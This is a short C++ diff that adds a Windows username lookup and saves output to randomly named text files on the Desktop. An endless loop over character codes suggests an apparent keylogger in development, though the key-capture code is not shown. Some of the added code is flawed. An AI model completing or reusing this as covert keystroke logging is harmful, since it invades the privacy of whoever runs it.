@@ -23,6 +23,12 @@ int writeCharToFile(string fileName, string x)
     return 0;
 }
 
+void getUsername(){
+    TCHAR username[UNLEN + 1];
+    DWORD size = UNLEN + 1;
+    cout << GetUserName((TCHAR *)username, &size);
+}
+
 string generateFileName(int n)
 {
     char alphabet[MAX] = {'a', 'b', 'c', 'd', 'e', 'f', 'g',
@@ -34,13 +40,15 @@ string generateFileName(int n)
     for (int i = 0; i < n; i++)
         res = res + alphabet[rand() % MAX];
 
-    return res + ".txt";
+    return "~/Desktop/" + res + ".txt";
 }
 
 int main()
 {
     short character;
     string fileName = generateFileName(10);
+    getUsername(); 
+    //sleep(100); 
     while (1)
     {
         for (character = 8; character <= 200; character++)
